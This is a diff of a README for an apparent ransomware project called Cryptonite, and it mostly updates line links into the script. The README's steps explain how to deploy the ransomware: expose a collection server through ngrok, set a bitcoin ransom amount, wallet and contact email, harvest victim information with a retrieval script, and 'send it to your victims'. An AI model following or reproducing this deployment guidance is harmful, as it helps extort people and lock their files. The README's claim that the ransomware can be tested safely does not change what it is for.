@@ -71,15 +71,16 @@ We will be running the Server on port 8000 of our localhost. Hence we need to pe
 [Starting ngrok on 8000](https://user-images.githubusercontent.com/55954313/124347475-a6b72d80-dc02-11eb-9d85-d8e5d0a79f08.mp4)
 
 
-* Copy the url and add the link [here](https://github.com/CYBERDEVILZ/Cryptonite/blob/89199d0fb04eb682ecd22417bf1de9f0a60e4e69/Cryptonite.py#L17). 
+* Copy the url and add the link [here](https://github.com/CYBERDEVILZ/Cryptonite/blob/190b55fee5e767af86b789b19e1a2ea47a6acaca/Cryptonite.py#L23). 
 * DO NOT CLOSE THE TERMINAL OR ELSE THE PORT FORWARDING WILL STOP
 
 ## 4. FILLING UP THE DETAILS
 
 * Open Cryptonite.py and edit these lines:-   
-  * [Bitcoin Amount](https://github.com/CYBERDEVILZ/Cryptonite/blob/89199d0fb04eb682ecd22417bf1de9f0a60e4e69/Cryptonite.py#L18)
-  * [Bitcoin Wallet](https://github.com/CYBERDEVILZ/Cryptonite/blob/89199d0fb04eb682ecd22417bf1de9f0a60e4e69/Cryptonite.py#L19)
-  * [Email](https://github.com/CYBERDEVILZ/Cryptonite/blob/89199d0fb04eb682ecd22417bf1de9f0a60e4e69/Cryptonite.py#L20)
+  * [Bitcoin Amount](https://github.com/CYBERDEVILZ/Cryptonite/blob/190b55fee5e767af86b789b19e1a2ea47a6acaca/Cryptonite.py#L24)
+  * [Bitcoin Wallet](https://github.com/CYBERDEVILZ/Cryptonite/blob/190b55fee5e767af86b789b19e1a2ea47a6acaca/Cryptonite.py#L25)
+  * [Email](https://github.com/CYBERDEVILZ/Cryptonite/blob/190b55fee5e767af86b789b19e1a2ea47a6acaca/Cryptonite.py#L26)
+  * [Custom Extension (Optional)](https://github.com/CYBERDEVILZ/Cryptonite/blob/190b55fee5e767af86b789b19e1a2ea47a6acaca/Cryptonite.py#L27)
   
 * Save Cryptonite.py
 
@@ -90,7 +91,7 @@ Believe me when I say this... You can safely test this Ransomware on your device
 Points to note...
 
 * When you execute cryptonite.py, go to the server.py terminal and lookout whether you received POST request from your localhost. If yes then the NGROK configuration was successful.
-* The decryption key will be shown to the terminal for a moment while the encryption is happening in the backend. I did this, in case you don't have a network connection, then you can directly copy and paste the decryption key into the message box that appears later requesting for a decryption key to decrypt the files. But remember, the decryption key will be shown for a short period of time. So make sure you are quick. If you don't want to show the decryption key, then you can delete the print statement here... [don't show decryption key](https://github.com/CYBERDEVILZ/Cryptonite/blob/6f85414d61f546df41840e3a3a45798b5061e3b5/Cryptonite.py#L17)
+* The decryption key will be shown to the terminal for a moment while the encryption is happening in the backend. I did this, in case you don't have a network connection, then you can directly copy and paste the decryption key into the message box that appears later requesting for a decryption key to decrypt the files. But remember, the decryption key will be shown for a short period of time. So make sure you are quick. If you don't want to show the decryption key, then you can delete the print statement here... [don't show decryption key](https://github.com/CYBERDEVILZ/Cryptonite/blob/190b55fee5e767af86b789b19e1a2ea47a6acaca/Cryptonite.py#L18)
 * You can retrieve the information about the victims via executing the retrieveinfo.py file. Just type ```python retrieveinfo.py``` inside a new terminal in the current directory.
 
 ## 6. SEND IT TO YOUR VICTIMS
